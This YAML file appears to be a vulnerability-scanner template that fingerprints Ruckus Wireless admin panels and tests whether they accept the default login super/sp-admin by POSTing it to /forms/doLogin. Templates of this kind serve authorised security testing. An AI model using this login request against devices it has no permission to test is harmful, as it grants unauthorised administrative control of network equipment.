name: poc-yaml-ruckus-default-password

transport: http
rules:
  check: 
    request:
      method: GET
      path: /login.asp
    expression: response.status == 200 && response.body.bcontains(b"Ruckus Wireless Admin") && response.headers["Server"].contains("GoAhead-Webs")
  ruckus:
    request:
      method: POST
      path: /forms/doLogin
      follow_redirects: false
      body: login_username=super&password=sp-admin
    expression: |
        response.status == 302 && response.body.bcontains(b"This document has moved to a new") && "(sid=\\d{9,10})".matches(response.headers["Set-Cookie"])
        
expression: 
  check() && ruckus()

detail:

  author: iak3ec(https://github.com/nu0l)
  description: ruckus-default-password
  links:
    -  https://www.92ez.com/?action=show&id=23420